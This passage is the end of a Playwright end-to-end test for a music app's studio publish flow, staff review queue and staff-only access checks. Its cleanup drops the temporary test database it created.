    await pg2.fill("#pName", "Studio Sketch"); await pg2.check("#pRights");
    await pg2.evaluate(() => window.scrollTo(0, 0));
    if (shots) await pg2.screenshot({ path: path.join(shots, "studio.png"), fullPage: true });
    await pg2.click("#pSend");
    await pg2.waitForFunction(() => /waiting for review|Sent|didn't|isn't|error/i.test(document.getElementById("pErr").textContent), null, { timeout: 60000 });
    const said = await pg2.locator("#pErr").innerText();
    const made = await one("SELECT * FROM community_items WHERE title='Studio Sketch'");
    ok(/waiting for review/.test(said) && made && made.made_in_studio && made.kind === "loop" && made.status === "waiting" && Number(made.bpm) === 100 && made.bars === 2, "the studio's Publish renders the timeline to a WAV loop and sends it into the upload flow (waiting for review)", { said, made });
    if (shots) await pg2.screenshot({ path: path.join(shots, "studio-published.png"), fullPage: true });
    // the review site, as the review admin
    const pg3 = await browser.newPage({ viewport: { width: 1280, height: 900 } });
    pg3.on("pageerror", (e) => errs.push(String(e)));
    await pg3.addInitScript((t) => localStorage.setItem("ma-token", t), rita.tok);
    await pg3.goto(base + rp + "/");
    await pg3.waitForSelector("[data-item]");
    ok(/Studio Sketch/.test(await pg3.locator("main").innerText()) && (await pg3.locator("audio").count()) >= 1 && !(await pg3.locator("[data-tab=admins]").count()), "the review site: the queue with the demo to listen to; no main-admin tabs for a review admin");
    if (shots) await pg3.screenshot({ path: path.join(shots, "review-queue.png"), fullPage: true });
    await pg3.locator('[data-item] .stars button[data-n="4"]').first().click();
    await pg3.locator('[data-do=approve]').first().click();
    await pg3.waitForSelector(".okmsg");
    ok((await one("SELECT status, stars FROM community_items WHERE id=$1", [made.id])).stars === 4, "graded 4 stars and approved from the page");
    const pg4 = await browser.newPage({ viewport: { width: 1280, height: 900 } });
    pg4.on("pageerror", (e) => errs.push(String(e)));
    await pg4.addInitScript((t) => localStorage.setItem("ma-token", t), owner.tok);
    await pg4.goto(base + rp + "/"); await pg4.waitForSelector("[data-tab=share]");
    await pg4.click("[data-tab=share]"); await pg4.waitForSelector("#shForm");
    if (shots) await pg4.screenshot({ path: path.join(shots, "review-share.png"), fullPage: true });
    await pg4.click("[data-tab=admins]"); await pg4.waitForSelector("#raForm");
    if (shots) await pg4.screenshot({ path: path.join(shots, "review-admins.png"), fullPage: true });
    await pg4.goto(base + "/#account"); await pg4.waitForSelector("#reviewCard a");
    ok((await pg4.locator("#reviewCard a").getAttribute("href")).endsWith(rp + "/"), "the owner's account page links to the review site (staff only)");
    const pg5 = await browser.newPage(); await pg5.addInitScript((t) => localStorage.setItem("ma-token", t), ana.tok); await pg5.goto(base + "/#account"); await pg5.waitForTimeout(1500);
    ok(!(await pg5.locator("#reviewCard").count()) && !(await pg5.content()).includes(rp), "...a creator's doesn't");
    const pg6 = await browser.newPage(); await pg6.addInitScript((t) => localStorage.setItem("ma-token", t), ana.tok); await pg6.goto(base + rp + "/"); await pg6.waitForSelector(".center");
    ok(/for Motion Audio staff/.test(await pg6.locator("main").innerText()) && !(await pg6.locator("[data-item]").count()), "a creator who has the address sees only that it's for staff");
    ok(!errs.length, "no page errors", errs);
  }
} catch (e) {
  fails++; console.error(e);
} finally {
  if (browser) await browser.close();
  srv.kill();
  try { const { pool } = await import("../src/db.js"); await pool.end(); } catch (_) { }
  await new Promise((r) => setTimeout(r, 300));
  await sql("DROP DATABASE IF EXISTS " + dbName + " WITH (FORCE)").catch(() => { });
  fs.rmSync(files, { recursive: true, force: true });
  console.log(fails ? "\n" + fails + " FAILED" : "\nall passed");
  process.exit(fails ? 1 : 0);
}
